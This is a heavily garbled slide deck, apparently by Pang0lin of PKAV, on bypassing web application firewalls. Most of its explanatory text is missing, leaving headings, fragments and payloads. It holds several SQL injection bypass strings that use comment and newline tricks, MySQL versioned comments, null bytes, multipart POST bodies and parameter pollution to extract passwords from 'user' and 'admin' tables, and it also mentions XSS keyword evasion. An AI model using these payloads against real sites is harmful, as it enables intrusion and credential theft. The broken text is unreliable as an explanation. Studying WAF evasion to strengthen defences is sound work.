WAF
By Pang0lin
 PKAV


 
WAFWAFWAF WAFWAF 

WAF 
WAF



PART 01 BypassWAF

PART 02 WAF

PART 03 WAF

PART 04
WAF 

BypassWAF


payloadid=-1 union%23%0aselect 1,2,3
id=-1 union%23%0aall select 1,2,3
payload id=1%00' union select 1,2,3 from user -- a id=1 union/*!50000select*/1,2,3
id=1 union%23%0aall select 2,username,3/*%00*//*!50001from*/user


WAFmutipart/form-data WAF mutipart/form-datapost data  
POST 
POST id=100 union /*!50001select*/1,username,password from user -- a


 
HPPWAFIISHPP HPPIISWAF
id=100 union/*&id=*/--+-%0aall select/*&id=*/1,password,2 as [/*] from [admin] -- a*/
100 union/*,*/--+-%0aall select/*,*/1,password,2 as [/*] from [admin] -- a*/

 WAF

WAF
WAF

WAF
WAFWAF (eg. /select.+from/is) WAF

 1. 2.

WAF


WAF  


 



 



 




01

methodmethodmethod

GETPOSTWAFmethod

02

mutipart/form-datamutipart/form-dataPOST DATA



mutipart

WAFWAFmutipart

03

HPPHPPWAF

HPP

04

POST

WAF



01



WAF

ban

02

mssqlunicodeWAF



03

%,%00,%a0

WAF



SQL

SQL 

SQL

union, select, from, where, exec


  

 



XSS

XSS

XSS

JS

XSS

SQL

 



  


TIPS
1. 1)mysql/*50001select*/ 2)1 as `/*` from user -- */ or '/*' from user --*/ 3)'-- ' from user -- a 2.xxxunionselect\s
3.\w8e1from\Nfrom
4.exec
5.JSscriptonembed, object, link, a
......


 
· 1.
<A1>SELECT<A2><B1>FROM<B2> select fromselectfrom eg(A1&B1)|(A2&B2)
· 2.


WAF

WAF

WAF

WAF





1.



2.WAF  3.

 WEB 





WEB  




URL_STATIC
URL_STATIC
URL_STATICURL 

URL_STATICWAF 1. 2. 3. 4. 5.method ......

URL_STATIC
WAF  


 WAF 
  

URL_STATIC
URL_STATICbypass  
URL_STATIC URL_STATIC WAF

WAF


WAF   WAF


WAF    

URL_STATIC
URL_STATIC      


    

THANK YOU!

